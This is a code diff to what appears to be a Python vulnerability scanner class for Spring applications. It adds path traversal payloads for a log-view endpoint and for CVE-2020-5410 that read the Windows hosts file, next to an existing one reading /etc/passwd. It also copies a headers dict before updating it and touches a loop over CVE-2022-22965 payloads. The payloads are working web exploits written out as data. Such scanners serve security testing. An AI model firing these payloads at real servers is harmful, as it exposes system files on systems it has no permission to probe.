@@ -44,6 +44,10 @@ class Spring():
                 'data': ''
             },
             {
+                'path': 'manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../',
+                'data': ''
+            },
+            {
                 'path': 'manage/log/view?filename=C:\Windows\System32\drivers\etc\hosts&base=../../../../../../../',
                 'data': ''
             }
@@ -52,6 +56,10 @@ class Spring():
         self.cve_2020_5410_payloads = [
             {
                 'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"',
+                'data': ''
+            },
+            {
+                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:/Windows/System32/drivers/etc/hosts%23foo/development"',
                 'data': ''
             },
             {
@@ -75,10 +83,10 @@ class Spring():
             'DNT': '1'
         }
 
-        headers = self.headers
+        headers = self.headers.copy()
         headers.update(vul_info['headers'])
 
-        for payload in self.cve_2022_22965_payloads:   # * Payload
+        for payload in self.cve_2022_22965_payloads:    # * Payload
             path = payload['path']                      # * Path
             data = payload['data']                      # * Data
             target = url + path                         # * Target
